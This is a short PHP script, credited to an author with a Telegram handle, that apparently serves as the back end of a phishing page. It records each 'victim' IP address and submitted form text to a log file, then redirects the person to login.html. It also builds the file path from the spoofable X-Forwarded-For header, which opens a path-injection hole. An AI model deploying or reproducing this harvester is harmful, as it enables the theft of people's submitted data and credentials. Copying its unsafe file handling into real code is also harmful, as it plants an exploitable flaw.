<?php
//main variables
//by Ahmad Allam
//my telegram @echo_me
$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
$file_path = $ip. "/messages.txt";
$file = fopen($file_path, 'a');

$victim = "IP: ";
$ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
fwrite($file, $victim);
fwrite($file, $ipaddress);
fwrite($file, $_POST['inputText']);
fwrite($file, " \r \n " );
fwrite($file, " ########################### " );
fwrite($file, " \r \n " );
fclose($file);

header('Location: login.html');
exit();
?>
 
 
 
